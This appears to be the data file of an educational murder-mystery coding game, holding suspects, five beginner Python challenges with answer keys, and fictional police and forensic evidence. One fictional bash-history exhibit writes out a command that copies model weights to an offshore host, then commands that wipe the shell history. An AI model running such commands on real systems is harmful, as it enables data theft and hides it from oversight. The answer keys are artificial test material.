// client/src/data/caseData.js
// Standalone Case Data for FALSE TRIALS by init Association

export const INITIAL_SUSPECTS = [
  { 
    id: 'S01', 
    name: 'Dr. Mira Sen', 
    role: 'CIVILIAN', 
    title: 'Senior Research Fellow',
    department: 'Biochemical AI & Foundation Systems',
    alibi: 'Claims she was calibrating mass spectrometers in Sub-Level B during the incident.',
    suspicionScore: 78
  },
  { 
    id: 'S02', 
    name: 'Noah Mercer', 
    role: 'CIVILIAN', 
    title: 'Lead Systems Architect',
    department: 'Infrastructure & Cloud Core',
    alibi: 'Claims he was in Server Room 2 responding to an automated thermal warning.',
    suspicionScore: 82
  },
  { 
    id: 'S03', 
    name: 'Felix Grant', 
    role: 'CIVILIAN', 
    title: 'Security Operations Lead',
    department: 'Physical & Cyber Access Command',
    alibi: 'Claims he was monitoring central dispatch and rebooting surveillance feeds.',
    suspicionScore: 85
  },
  { 
    id: 'S04', 
    name: 'Elena Ward', 
    role: 'HACKER', 
    title: 'Director of Operations',
    department: 'Executive Strategy & Global Partnerships',
    alibi: 'Claims she was preparing quarterly compliance slides in Executive Suite 404.',
    suspicionScore: 65
  }
];

// The 5 Sequential Python Coding Challenges
export const PYTHON_CHALLENGES = [
  {
    id: 'CHAL-PY-1',
    stageNumber: 1,
    title: 'Find the Bypass Key',
    concept: 'String manipulation & .split()',
    difficulty: 'LEVEL 1 // FOUNDATION',
    rewardScore: 100,
    forensicContext: 'A corrupted gateway buffer packet was recovered from the firewall ingress router. Extract the administrative bypass key from the raw HTTP header using string operations.',
    instructions: 'Use Python string methods (such as .split()) to isolate the exact value of the "X-Bypass-Key" header.',
    initialCode: `# Challenge 1: Find the Bypass Key
# Extract the value of X-Bypass-Key from the raw HTTP header string.

header = "Host: sec.local\\r\\nX-Bypass-Key: BYPASS-ELENA-WARD-99\\r\\nUser-Agent: Terminal/1.0"

# TODO: Extract and print the value of X-Bypass-Key using string manipulation (e.g. .split())

`,
    expected: 'BYPASS-ELENA-WARD-99',
    acceptedAlternatives: ['BYPASS-ELENA-WARD', 'BYPASS-ELENA-WARD-99'],
    hint: 'Split the header on "\\r\\n" or look for the line starting with "X-Bypass-Key:". Split that line on ": " to obtain the key.',
    unlocksEvidenceBatch: 2,
    unlockSummary: 'Unlocks Batch 2: Police interview with Dr. Sen, Ingress Syslog dump, and Felix Grant\'s shift notes.'
  },
  {
    id: 'CHAL-PY-2',
    stageNumber: 2,
    title: 'Identify the Suspicious Login',
    concept: 'Lists, Loops & Conditional Statements',
    difficulty: 'LEVEL 2 // INTERMEDIATE',
    rewardScore: 100,
    forensicContext: 'Noah Mercer\'s workstation auth logs recorded several login attempts right before terminal history was wiped. Identify the username that recorded a "FAILED" login event.',
    instructions: 'Iterate over the list of login records using a for loop and if statement to find and print the username with a "FAILED" status.',
    initialCode: `# Challenge 2: Identify the Suspicious Login
# Search through login_records to find the username with "FAILED" status.

login_records = [
    ("mira_sen", "SUCCESS"),
    ("noah_mercer", "SUCCESS"),
    ("felix_grant", "SUCCESS"),
    ("guest_temp", "FAILED"),
    ("elena_ward", "SUCCESS")
]

# TODO: Iterate through login_records and print the username that has a "FAILED" status

`,
    expected: 'guest_temp',
    acceptedAlternatives: ['guest_temp', '"guest_temp"'],
    hint: 'Iterate through each tuple (user, status) in login_records. Check if status == "FAILED", then print that user.',
    unlocksEvidenceBatch: 3,
    unlockSummary: 'Unlocks Batch 3: Noah Mercer\'s deleted bash history, Noah\'s interrogation transcript, and Dr. Sen\'s patent notice.'
  },
  {
    id: 'CHAL-PY-3',
    stageNumber: 3,
    title: 'Find the Impostor',
    concept: 'Membership Checks (in / not in) & Collections',
    difficulty: 'LEVEL 3 // ADVANCED',
    rewardScore: 100,
    forensicContext: 'Core database logs show an active account that executed elevated privileges. Cross-reference the logged usernames against the authorized personnel list to identify the unlisted impostor.',
    instructions: 'Identify which username in `logged_users` does NOT appear in `authorized_users`. Print the impostor\'s username.',
    initialCode: `# Challenge 3: Find the Impostor
# Find the username in logged_users that is absent from authorized_users.

authorized_users = ["mira_sen", "noah_mercer", "felix_grant", "elena_ward", "adrian_vale"]
logged_users = ["mira_sen", "felix_grant", "shadow_operator", "elena_ward"]

# TODO: Find the username in logged_users that does NOT appear in authorized_users and print it

`,
    expected: 'shadow_operator',
    acceptedAlternatives: ['shadow_operator', '"shadow_operator"'],
    hint: 'Use `if user not in authorized_users:` inside a loop over `logged_users` to spot the unauthorized account.',
    unlocksEvidenceBatch: 4,
    unlockSummary: 'Unlocks Batch 4: Rogue user database trace, Felix Grant\'s bribe confession, and chemical quarantine verification.'
  },
  {
    id: 'CHAL-PY-4',
    stageNumber: 4,
    title: 'Crack the Access Rule',
    concept: 'Boolean Logic & Dual-Condition Rules',
    difficulty: 'LEVEL 4 // SECURE ACCESS',
    rewardScore: 100,
    forensicContext: 'Adrian\'s private research sanctum was locked by an automated dual-authentication policy. Test the rule to determine the exact return status for user "elena_ward" with access code "SEC-7702".',
    instructions: 'Evaluate the access function. Ensure it requires BOTH that the user is authorized AND the code matches the valid code, then print the result.',
    initialCode: `# Challenge 4: Crack the Access Rule
# Grant access only when user is authorized AND code matches valid_code.

def check_access(user, code):
    authorized_users = ["elena_ward", "adrian_vale"]
    valid_code = "SEC-7702"
    
    # TODO: Verify BOTH conditions: user must be in authorized_users AND code must equal valid_code.
    # Return "ACCESS_GRANTED" if authorized, otherwise return "ACCESS_DENIED".
    pass

# TODO: Call check_access for user "elena_ward" with code "SEC-7702" and print the returned status

`,
    expected: 'ACCESS_GRANTED',
    acceptedAlternatives: ['ACCESS_GRANTED', '"ACCESS_GRANTED"'],
    hint: 'Check if both conditions (user in authorized_users and code == valid_code) evaluate to True. It returns "ACCESS_GRANTED".',
    unlocksEvidenceBatch: 5,
    unlockSummary: 'Unlocks Batch 5: Elena\'s deleted offshore emails, door override logs, and the lounge witness statement.'
  },
  {
    id: 'CHAL-PY-5',
    stageNumber: 5,
    title: 'Server Access Investigation',
    concept: 'Structured Telemetry Log Parsing & Filtering',
    difficulty: 'LEVEL 5 // SENIOR FORENSICS',
    rewardScore: 100,
    forensicContext: 'Below are the structured authentication logs from the central gateway on the morning of the incident. Filter through timestamps, status codes (200, 401, 403), and messages to identify who completed the LATEST SUCCESSFUL login (status 200), ignoring all later failed or denied attempts.',
    instructions: 'Filter the list for entries where `status == 200`. Find the record with the latest timestamp and print the username of that user.',
    initialCode: `# Challenge 5: Server Access Investigation
# Analyze structured authentication telemetry.
# Identify the username responsible for the LATEST SUCCESSFUL login (status == 200).
# Ignore subsequent failed (401) or forbidden (403) events.

auth_logs = [
    {"timestamp": "08:12:00", "user": "mira_sen", "status": 200, "ip": "10.0.1.12", "msg": "Auth OK - Workstation B"},
    {"timestamp": "08:19:30", "user": "noah_mercer", "status": 200, "ip": "10.0.1.45", "msg": "Auth OK - Server Sub-1"},
    {"timestamp": "08:24:10", "user": "felix_grant", "status": 200, "ip": "10.0.2.19", "msg": "Auth OK - Security Desk"},
    {"timestamp": "08:31:45", "user": "elena_ward", "status": 200, "ip": "10.0.4.01", "msg": "Auth OK - Executive Gateway"},
    {"timestamp": "08:34:10", "user": "felix_grant", "status": 401, "ip": "10.0.2.19", "msg": "Auth Failed - Bad Pin"},
    {"timestamp": "08:38:00", "user": "mira_sen", "status": 403, "ip": "10.0.1.12", "msg": "Access Denied - Lockdown Active"},
    {"timestamp": "08:42:15", "user": "noah_mercer", "status": 401, "ip": "10.0.1.45", "msg": "Auth Failed - Session Terminated"}
]

# TODO: Filter auth_logs for status == 200, identify the record with the latest timestamp, and print the username

`,
    expected: 'elena_ward',
    acceptedAlternatives: ['elena_ward', '"elena_ward"'],
    hint: 'Filter for entries where status == 200. The timestamps are 08:12:00, 08:19:30, 08:24:10, and 08:31:45. 08:31:45 is the latest, belonging to elena_ward.',
    unlocksEvidenceBatch: 6,
    unlockSummary: 'Unlocks Final Batch 6: Master auth telemetry ledger, biometric fingerprint match report, and High Tribunal dossier!'
  }
];

// Complete Authentic Evidence Dossier (18 Files Across 6 Progressive Batches)
export const ALL_EVIDENCE_FILES = [
  // BATCH 1 (Initial - Stage 0, Unlocked immediately)
  {
    id: 'DOC-101',
    refCode: 'CAD-88102',
    batch: 1,
    title: 'First Responder Police Incident Report',
    type: 'POLICE_REPORT',
    classification: 'RESTRICTED // LAW ENFORCEMENT SENSITIVE',
    timestamp: '08:37:12',
    signoff: 'Det. Inspector V. Cross, Badge #4489',
    suspectLinked: 'Multiple',
    shortSummary: 'Dr. Adrian Vale found collapsed in Lab 101. Unconscious, cyanotic symptoms, beverage on desk.',
    documentBody: `METROPOLITAN POLICE DEPARTMENT // EMERGENCY RESPONSE DISPATCH
CASE NUMBER: 2026-CR-09941 | DISPATCH CAD: #88102
DATE: 2026-10-27 | RESPONDING UNITS: 4B, 4C, PARICS-01

INCIDENT OVERVIEW:
At 08:35:10, an emergency panic distress call was triggered from Research Wing Lab 101. 
Officers arrived at 08:37:12. Dr. Adrian Vale (Male, Age 47, Chief AI Scientist) was discovered 
slumped over his central computer terminal. Pulse absent; pupil dilation severe; cyanosis around 
the lips and fingertips indicates rapid hypoxic arrest.

CRIME SCENE OBSERVATIONS:
1. Workstation terminal was powered on and active, showing an unfinished audit report.
2. A ceramic coffee mug, half-consumed, was situated on the desk coaster 10cm from victim's right hand.
3. No signs of violent forced entry or physical struggle. Door lock showed normal digital engagement.
4. Crime scene secured under Level-4 biohazard and homicide protocols.`,
    tags: ['First Responder', 'Lab 101', 'Poison Suspicion', 'Crime Scene']
  },
  {
    id: 'TOX-102',
    refCode: 'TOX-PATH-01',
    batch: 1,
    title: 'Forensic Pathology & Toxicology Screening Protocol',
    type: 'TOXICOLOGY_REPORT',
    classification: 'CONFIDENTIAL // FORENSIC PATHOLOGY SERVICE',
    timestamp: '09:15:00',
    signoff: 'Dr. H. Arisawa, MD, Chief Forensic Pathologist',
    suspectLinked: 'All Personnel',
    shortSummary: 'Lethal dose of organophosphate neurotoxin ingested orally between 08:25 and 08:32.',
    documentBody: `DEPARTMENT OF FORENSIC SERVICES // BIOCHEMICAL PATHOLOGY UNIT
AUTOPSY REF: AUT-2026-881 | DECEASED: DR. ADRIAN VALE

TOXICOLOGICAL ANALYSIS:
1. Blood serum screening identified toxic levels of an organophosphate acetylcholinesterase inhibitor.
2. Estimated time of ingestion: 08:25:00 - 08:32:00. Time of collapse: ~08:33:00.
3. Residue matching the identical chemical signature was detected inside the ceramic coffee vessel.
4. CONCLUSION: Homicide by oral poisoning. Delivery vehicle was an ingested hot beverage.`,
    tags: ['Toxicology', 'Organophosphate', 'Beverage Delivery', 'Lethal Dose']
  },
  {
    id: 'SEC-103',
    refCode: 'BADGE-AUDIT-08',
    batch: 1,
    title: 'Physical Security Badge Reader Summary (08:00 - 08:40)',
    type: 'BADGE_TELEMETRY',
    classification: 'INTERNAL SECURITY USE ONLY',
    timestamp: '08:45:00',
    signoff: 'Access Control Automated Daemon v3.2',
    suspectLinked: 'Dr. Mira Sen, Noah Mercer, Felix Grant, Elena Ward',
    shortSummary: 'Confirms all 4 key suspects were present on the 4th floor within 15 minutes of the murder.',
    documentBody: `BUILDING TELEMETRY // RESEARCH WING 4TH FLOOR ACCESS LOG
RANGE: 08:00:00 - 08:40:00 | CONTROLLER: GW-4F-CORE

LOGGED SWIPES:
- 08:18:22 | S01 Dr. Mira Sen     | 4F Main Turnstile (IN)   | Destination: Biochemical Lab 102
- 08:21:05 | S02 Noah Mercer      | Server Sub-1 Vault (IN)  | Destination: Network Core Rack
- 08:24:40 | S03 Felix Grant      | Security Console (IN)    | Destination: CCTV Dispatch Room
- 08:28:15 | S04 Elena Ward       | Executive Elevator (IN)  | Destination: 4F Executive Corridor
- 08:32:00 | S04 Elena Ward       | Lab 101 Access Door (IN) | Keycard Swipe OK (Dual-Auth)

EVALUATION:
All four primary suspects possessed physical access opportunity during the critical window.`,
    tags: ['Badge Log', 'Suspect Presence', 'Opportunity', '4th Floor']
  },

  // BATCH 2 (Unlocked after Challenge 1: Find the Bypass Key)
  {
    id: 'POL-201',
    refCode: 'STMT-SEN-01',
    batch: 2,
    title: 'Witness Statement: Dr. Mira Sen',
    type: 'INTERVIEW_TRANSCRIPT',
    classification: 'RESTRICTED // INVESTIGATION FILE',
    timestamp: '09:40:00',
    signoff: 'Det. Inspector V. Cross / Witness: Dr. Mira Sen',
    suspectLinked: 'Dr. Mira Sen, Noah Mercer',
    shortSummary: 'Admits to heated patent argument with Adrian. Accuses Noah Mercer of offloading model weights.',
    documentBody: `METROPOLITAN POLICE TRANSCRIPT // INTERVIEW OF DR. MIRA SEN
INTERVIEW DATE: 2026-10-27 09:40 | LOCATION: INTERVIEW ROOM B

SEN: "Look, I won't lie to you. Adrian and I had a ferocious argument yesterday evening. He was attempting 
to strip my name from the foundation model patent application. I told him he was committing theft of my life's work.
But I didn't kill him! If you want to find who was stealing from him, look at Noah Mercer. Noah has been secretly 
downloading bulk neural weights and meeting with private equity reps off campus."

DETECTIVE: "Dr. Sen, chemical checkout logs show you requisitioned 50ml of organophosphate solvent on Monday. Why?"
SEN: "That was for baseline spectrometer calibration in Lab 102! It's locked in my storage cabinet right now."`,
    tags: ['Dr. Mira Sen', 'Patent Dispute', 'Motive', 'Accuses Noah']
  },
  {
    id: 'LOG-202',
    refCode: 'PCAP-BYPASS-01',
    batch: 2,
    title: 'Firewall Ingress Packet Trace // Core Gateway 443',
    type: 'SERVER_LOG',
    classification: 'CONFIDENTIAL // CYBER FORENSICS UNIT',
    timestamp: '08:25:12',
    signoff: 'Cyber Incident Response Team (CIRT)',
    suspectLinked: 'Elena Ward',
    shortSummary: 'Ingress packet contains header X-Bypass-Key: BYPASS-ELENA-WARD-99 overriding perimeter sensors.',
    documentBody: `CIRT NETWORK INGRESS AUDIT // PCAP CAPTURE FRAME #44921
TIMESTAMP: 08:25:12.401 | INGRESS GATEWAY: 10.0.4.01 -> INTERNAL-CORE

RAW PACKET HEADER:
Host: sec.local
X-Bypass-Key: BYPASS-ELENA-WARD-99
User-Agent: Terminal/1.0
Authorization: Bearer [REDACTED_EXECUTIVE_TOKEN]

ANALYSIS:
This raw bypass key was transmitted to disable alert triggers on internal door relays between 08:25 and 08:35.
The key syntax explicitly embeds the clearance string of executive Director Elena Ward.`,
    tags: ['Packet Trace', 'Bypass Key', 'Elena Ward', 'Alarm Suppression']
  },
  {
    id: 'SEC-203',
    refCode: 'LOG-FELIX-01',
    batch: 2,
    title: 'Security Console Incident Notes // Felix Grant',
    type: 'SECURITY_LOG',
    classification: 'INTERNAL DISPATCH LOG',
    timestamp: '08:40:00',
    signoff: 'Operator Felix Grant, Lead Security',
    suspectLinked: 'Felix Grant',
    shortSummary: 'Felix reports CCTV Camera 4 suffered a "hardware video desync" between 08:26 and 08:38.',
    documentBody: `SECURITY OPERATIONS CENTER // SHIFT LOG
SHIFT LEAD: FELIX GRANT | DATE: 2026-10-27

INCIDENT LOG ENTRY:
At 08:26:00, CCTV Feed #04 (covering the 4th Floor Corridor leading directly to Lab 101) displayed video signal 
desynchronization and repeated static frames. Attempted remote reboot at 08:31. Feed stabilized at 08:38:00.
Assumed routine fiber optic line fluctuation.

ANALYST NOTE:
Subsequent forensic audit shows the video was NOT desynced by hardware failure—it was deliberately looped 
from a recorded 15-minute buffer executed from the security master console.`,
    tags: ['Felix Grant', 'CCTV Tampering', 'Video Loop', 'Corridor Blindspot']
  },

  // BATCH 3 (Unlocked after Challenge 2: Identify the Suspicious Login)
  {
    id: 'AUD-301',
    refCode: 'BASH-NOAH-02',
    batch: 3,
    title: 'Terminal Command History & Bash Audit // Workstation Sub-1',
    type: 'SYSTEM_AUDIT',
    classification: 'RESTRICTED // DIGITAL FORENSICS',
    timestamp: '08:42:15',
    signoff: 'SysAdmin S. Miller, Forensic IT',
    suspectLinked: 'Noah Mercer',
    shortSummary: 'Noah ran history wipe commands at 08:42. Multiple failed attempts using account guest_temp.',
    documentBody: `FORENSIC IT DUMP // WORKSTATION IP: 10.0.1.45 (NOAH MERCER)
LOG EXTRACT: ~/.bash_history & auth.log

08:39:10 | sudo -u guest_temp login --failed [401 Invalid Auth]
08:40:02 | rsync -avz --progress /model/weights/ export@offshore-vps.net:~/vault/
08:42:15 | rm -rf ~/.bash_history
08:42:18 | history -c && kill -9 $$

EVALUATION:
Workstation logged active attempt to conceal terminal actions and transfer large compressed datasets 
moments after the alarm was raised. Account "guest_temp" was used in failed escalation attempts.`,
    tags: ['Noah Mercer', 'Bash Deletion', 'guest_temp', 'Exfiltration Attempt']
  },
  {
    id: 'POL-302',
    refCode: 'STMT-NOAH-01',
    batch: 3,
    title: 'Suspect Interrogation Transcript: Noah Mercer',
    type: 'INTERVIEW_TRANSCRIPT',
    classification: 'METROPOLITAN POLICE HOMICIDE DIVISION',
    timestamp: '10:15:00',
    signoff: 'Det. Inspector V. Cross / Suspect: Noah Mercer',
    suspectLinked: 'Noah Mercer, Dr. Mira Sen',
    shortSummary: 'Noah claims his machine was remotely hijacked and that Dr. Sen had physical access to his desk.',
    documentBody: `METROPOLITAN POLICE INTERVIEW RECORD
SUSPECT: NOAH MERCER | ATTORNEY PRESENT: YES

MERCER: "I didn't erase my history! My terminal was compromised through a rogue SSH tunnel. 
I left my desk at 08:20 to get coffee from the 2nd floor pantry. When I came back, the shell was hanging. 
Dr. Mira Sen was seen loitering near my row at 08:22—she knows Unix systems just as well as I do. 
She is trying to pin the data exfiltration on me!"

DETECTIVE: "Then why did your personal banking records show a wire transfer pending from an offshore shell corporation?"
MERCER: "That's an investment dividend! It has nothing to do with Adrian Vale!"`,
    tags: ['Noah Mercer', 'Alibi Defense', 'Accuses Dr. Sen', 'Wire Transfer']
  },
  {
    id: 'MEM-303',
    refCode: 'LEGAL-VALE-09',
    batch: 3,
    title: 'Confidential Legal Notice // Cease & Desist Ref #L-992',
    type: 'LEGAL_NOTICE',
    classification: 'CONFIDENTIAL ATTORNEY-CLIENT PRIVILEGE',
    timestamp: '07:50:00',
    signoff: 'Sterling & Partners LLP, Counsel for Dr. Adrian Vale',
    suspectLinked: 'Dr. Mira Sen',
    shortSummary: 'Adrian had drafted an emergency injunction to fire Dr. Sen and pursue criminal IP theft charges.',
    documentBody: `STERLING & PARTNERS LLP // LEGAL MEMORANDUM
TO: DR. ADRIAN VALE | RE: UNAUTHORIZED PATENT REASSIGNMENT

Dear Dr. Vale,
As requested, we have completed drafting the emergency injunction against Dr. Mira Sen regarding her unauthorized 
submission of the Quantum-Biochemical patent. If she does not sign the waiver by 12:00 PM today, we will proceed 
with filing criminal fraud charges with the federal prosecutor.

She stands to lose all academic credentials and commercial royalty claims. Her motive to prevent this filing is severe.`,
    tags: ['Dr. Mira Sen', 'Legal Notice', 'Motive', 'Financial Ruin']
  },

  // BATCH 4 (Unlocked after Challenge 3: Find the Impostor)
  {
    id: 'NET-401',
    refCode: 'IAM-IMPOSTOR-03',
    batch: 4,
    title: 'Identity & Access Management Audit // Impostor Account Flag',
    type: 'SECURITY_ALERT',
    classification: 'CONFIDENTIAL // IAM AUDIT',
    timestamp: '08:22:00',
    signoff: 'Central Directory Server (ActiveDirectory / LDAP)',
    suspectLinked: 'Elena Ward, Felix Grant',
    shortSummary: 'Rogue account shadow_operator discovered; created via executive administrative delegation.',
    documentBody: `IAM LOG AUDIT // ANOMALOUS MEMBERSHIP DETECTION
AUTHORIZED USERS: ["mira_sen", "noah_mercer", "felix_grant", "elena_ward", "adrian_vale"]
LOGGED ACTIVE SESSIONS: ["mira_sen", "felix_grant", "shadow_operator", "elena_ward"]

ANOMALY IDENTIFIED:
User "shadow_operator" is NOT an authorized engineering employee.
Record shows account was provisioned with Executive Override credentials from terminal 10.0.4.01 (Executive Suite).
The account was granted permission to modify telemetry and audit routing.`,
    tags: ['shadow_operator', 'Impostor', 'Executive Override', 'Database Tamper']
  },
  {
    id: 'POL-402',
    refCode: 'CONF-FELIX-02',
    batch: 4,
    title: 'Confession Transcript: Felix Grant (Security Lead)',
    type: 'INTERVIEW_TRANSCRIPT',
    classification: 'RESTRICTED // FORMAL POLICE CONFESSION',
    timestamp: '11:00:00',
    signoff: 'Det. Inspector V. Cross / Suspect: Felix Grant',
    suspectLinked: 'Felix Grant, Elena Ward',
    shortSummary: 'Felix confesses to taking a $50k crypto bribe to loop CCTV Feed 4, but denies committing murder.',
    documentBody: `POLICE TRANSCRIPT // FELIX GRANT FORMAL CONFESSION
DATE: 2026-10-27 11:00 | CAUTION ADMINISTERED

GRANT: "Alright! Stop pressuring me with homicide! I didn't murder Adrian!
I was paid. Fifty thousand dollars in Monero. The instructions came through an encrypted Signal handle called 'NEXUS-01'. 
I was told to loop Camera 4 from 08:25 to 08:38 so someone could access Adrian's office without video recording. 
They told me it was just to copy files! I swear on my life, I didn't know anyone was going to poison him!"

DETECTIVE: "Who was behind NEXUS-01?"
GRANT: "I only recognized the administrative token key used to verify the transaction... It originated from the Executive Suite."`,
    tags: ['Felix Grant', 'Bribe Confession', 'CCTV Looping', 'Accomplice Cleared of Murder']
  },
  {
    id: 'LAB-403',
    refCode: 'CHEM-VERIF-04',
    batch: 4,
    title: 'Forensic Chemical Verification // Chemical Storage Quarantine Log',
    type: 'FORENSIC_ANALYSIS',
    classification: 'OFFICIAL SCIENTIFIC FORENSICS PROTOCOL',
    timestamp: '11:30:00',
    signoff: 'Dr. T. Morales, State Forensic Chemist',
    suspectLinked: 'Dr. Mira Sen (Exonerated from Chemical Requisition)',
    shortSummary: 'The organophosphate solvent checked out by Dr. Sen was discovered untouched and unopened in her locker.',
    documentBody: `STATE FORENSIC CRIME LAB // EVIDENCE ANALYSIS
ITEM REF: REAG-SEN-50ML | RETRIEVED FROM: LAB 102 QUARANTINE LOCKER

CHEMICAL REPORT:
1. Reagent vial checked out by Dr. Mira Sen on Monday was located in Locker #14.
2. The manufacturer's tamper-evident vacuum seal was INTACT and UNBROKEN.
3. Liquid volume: Exactly 50.0ml. Zero liquid was extracted.
4. CONCLUSION: The neurotoxin used to kill Dr. Adrian Vale did NOT originate from Dr. Sen's requisitioned supply. 
   Dr. Sen's chemical checkout was either a coincidence or intentionally used as a decoy to frame her.`,
    tags: ['Dr. Mira Sen', 'Unopened Reagent', 'Decoy / Framing', 'Exoneration']
  },

  // BATCH 5 (Unlocked after Challenge 4: Crack the Access Rule)
  {
    id: 'MEM-501',
    refCode: 'EXPO-ELENA-01',
    batch: 5,
    title: 'Recovered Deleted Emails // Elena Ward & Offshore Syndicate',
    type: 'CONFIDENTIAL_MEMO',
    classification: 'FEDERAL CYBERCRIME INJUNCTION EVIDENCE',
    timestamp: '08:05:12',
    signoff: 'Federal Cyber Task Force / Forensic Extraction',
    suspectLinked: 'Elena Ward',
    shortSummary: 'Elena had agreed to sell Adrian\'s proprietary model for $12M. Adrian scheduled a 09:00 audit to expose her.',
    documentBody: `CONFIDENTIAL EMAIL RECOVERY // PGP ENCRYPTED DEPOSIT
FROM: elena.ward@internal-exec.com
TO: syndicate-broker@panama-corp.net
DATE: 2026-10-26 23:14:02

"Adrian has discovered the hash mismatch on the model weights registry. He called an emergency audit 
meeting with the board of directors for 09:00 AM tomorrow. If he opens that ledger, both the transfer 
and the Swiss routing numbers will be exposed. 
I will handle Adrian personally before 08:35. The 09:00 audit will not take place. Ensure the second escrow 
tranche of $6,000,000 is released upon confirmation."`,
    tags: ['Elena Ward', 'Offshore Scheme', 'Motive Proven', 'Audit Suppression']
  },
  {
    id: 'SEC-502',
    refCode: 'RULE-VALVE-04',
    batch: 5,
    title: 'Cryptographic Access Rule Verification Protocol',
    type: 'ACCESS_PROTOCOL',
    classification: 'SYSTEM SECURITY POLICY RECORD',
    timestamp: '08:30:00',
    signoff: 'Building Security Controller Kernel v9.4',
    suspectLinked: 'Elena Ward',
    shortSummary: 'Rule confirms door access code SEC-7702 combined with credential elena_ward unlocked Lab 101 door.',
    documentBody: `ACCESS CONTROLLER RULE VERIFICATION // LAB 101 INNER SANCTUM
POLICY FUNCTION: check_access(user, code)
CRITERIA: user in ["elena_ward", "adrian_vale"] AND code == "SEC-7702"

LOGGED INVOCATION AT 08:31:00:
- user: "elena_ward"
- code: "SEC-7702"
- EVALUATION: ACCESS_GRANTED
- MAGNETIC STRIKE RELEASED: 08:31:02
- DOOR OPEN SENSOR: 08:31:05
- DOOR CLOSE SENSOR: 08:33:14

CONFIRMATION:
Elena Ward used her personal authorization token and executive PIN to unlock Adrian's private office 
during the exact minute the beverage was poisoned.`,
    tags: ['Elena Ward', 'Door Access', 'SEC-7702', 'ACCESS_GRANTED']
  },
  {
    id: 'WIT-503',
    refCode: 'STMT-ATTEND-03',
    batch: 5,
    title: 'Staff Witness Deposition // Executive Lounge Attendant',
    type: 'WITNESS_STATEMENT',
    classification: 'METROPOLITAN POLICE HOMICIDE WITNESS LOG',
    timestamp: '11:45:00',
    signoff: 'Officer K. Blake / Witness: Clara Vance, Lounge Host',
    suspectLinked: 'Elena Ward',
    shortSummary: 'Attendant witnessed Elena Ward prepare two coffees at 08:27 and carry them into Adrian\'s office.',
    documentBody: `WITNESS DEPOSITION // EXECUTIVE SUITE PANTRY
WITNESS: CLARA VANCE, HOSPITALITY ASSOCIATE

"At approximately 08:26 AM, Director Elena Ward came into the executive coffee station. She specifically brewed 
two cups of Colombian roast—Dr. Adrian Vale's favorite blend. She added sugar to one and kept the other black.
I offered to carry them down to Dr. Vale's office for her, but she insisted very firmly: 'No Clara, I need to have 
a private conversation with Adrian before his 09:00 meeting. I will take it myself.'
She walked towards the 4th Floor corridor at 08:28 carrying both cups."`,
    tags: ['Elena Ward', 'Coffee Delivery', 'Eye Witness', 'Lethal Ingestion Vehicle']
  },

  // BATCH 6 (Unlocked after Challenge 5: Server Access Investigation - Final Proof)
  {
    id: 'LOG-601',
    refCode: 'AUTH-FINAL-05',
    batch: 6,
    title: 'Master Authentication Telemetry Ledger // Gateway Audit Final',
    type: 'AUTH_TELEMETRY',
    classification: 'CRIMINAL EVIDENCE EXHIBIT A',
    timestamp: '08:31:45',
    signoff: 'Forensic Telemetry Inspector // Case Lead',
    suspectLinked: 'Elena Ward (Primary Perpetrator)',
    shortSummary: 'Final auth telemetry confirms elena_ward was the latest successful login (status 200) at 08:31:45.',
    documentBody: `CENTRAL GATEWAY AUTHENTICATION LOG AUDIT
EXHIBIT ID: EXHIBIT-AUTH-MASTER | TIMESTAMP RANGE: 08:12 - 08:45

[08:12:00] mira_sen     | IP: 10.0.1.12 | HTTP 200 OK - Workstation B
[08:19:30] noah_mercer   | IP: 10.0.1.45 | HTTP 200 OK - Server Sub-1
[08:24:10] felix_grant   | IP: 10.0.2.19 | HTTP 200 OK - Security Desk
[08:31:45] elena_ward    | IP: 10.0.4.01 | HTTP 200 OK - Executive Gateway [LATEST SUCCESSFUL LOGIN]
[08:34:10] felix_grant   | IP: 10.0.2.19 | HTTP 401 Unauthorized - Bad Pin
[08:38:00] mira_sen     | IP: 10.0.1.12 | HTTP 403 Forbidden - Lockdown Active
[08:42:15] noah_mercer   | IP: 10.0.1.45 | HTTP 401 Unauthorized - Session Terminated

FORENSIC CONCLUSION:
Elena Ward's terminal connection at 08:31:45 was the last authenticated session before Adrian collapsed.`,
    tags: ['Elena Ward', 'Status 200', '08:31:45', 'Final Gateway Audit']
  },
  {
    id: 'BIO-602',
    refCode: 'DNA-MUG-99',
    batch: 6,
    title: 'Forensic Fingerprint & Latent DNA Match Report',
    type: 'CRIMELAB_DNA',
    classification: 'METROPOLITAN POLICE FORENSIC BIOLOGY SERVICE',
    timestamp: '12:05:00',
    signoff: 'Dr. C. Mendez, Lead DNA / Fingerprint Specialist',
    suspectLinked: 'Elena Ward',
    shortSummary: 'Elena Ward\'s latent fingerprint and epithelial DNA found on the handle of the poisoned coffee cup.',
    documentBody: `STATE FORENSIC BIOLOGY UNIT // REPORT REF: BIO-2026-9921
EVIDENCE OBJECT: CERAMIC COFFEE VESSEL RECOVERED FROM CRIME SCENE

LATENT PRINT ANALYSIS:
- Left index finger and thumb ridge impressions recovered from the mug exterior handle.
- AFIS MATCH: Elena Ward (10-point biometric verification confirmed, Probability of error < 1 in 100,000,000).

EPITHELIAL DNA SWAB:
- High-yield single-source female DNA profile extracted from handle contact zone.
- Profile matches reference exemplar of ELENA WARD (STR multiplex loci match 16/16).
- Zero genetic material from Dr. Mira Sen or Noah Mercer detected on the drinking vessel.`,
    tags: ['Elena Ward', 'Fingerprint Match', 'DNA Confirmation', 'Poison Mug Handle']
  },
  {
    id: 'CASE-SUMMARY',
    refCode: 'TRIBUNAL-DOSSIER-FINAL',
    batch: 6,
    title: 'High Tribunal Executive Indictment Dossier',
    type: 'FINAL_DOSSIER',
    classification: 'HIGH TRIBUNAL CASE BRIEF // FORMAL INDICTMENT',
    timestamp: '12:30:00',
    signoff: 'init Association High Tribunal Oversight Committee',
    suspectLinked: 'Elena Ward (Guilty as Charged)',
    shortSummary: 'Synthesis of the complete forensic chain: Elena Ward poisoned Adrian to prevent the 09:00 audit.',
    documentBody: `INIT ASSOCIATION // HIGH TRIBUNAL FINAL CASE SYNOPSIS
CASE: THE MURDER OF DR. ADRIAN VALE | ACCUSED: ELENA WARD

THE CRIME:
1. MOTIVE: Dr. Adrian Vale discovered Elena Ward's unauthorized offshore export of proprietary foundation model weights (MEM-501) and scheduled a formal board audit for 09:00 AM.
2. METHOD: Elena prepared a hot coffee in the executive lounge (WIT-503), laced it with an organophosphate neurotoxin (TOX-102), and carried it directly to Adrian's office (SEC-502).
3. ALIBI & CONCEALMENT: She bribed security lead Felix Grant $50,000 to loop CCTV Camera 4 (POL-402), used an executive bypass key (LOG-202) and access code SEC-7702 (SEC-502) to unlock the door, and planted network evidence to frame Noah Mercer and Dr. Mira Sen.
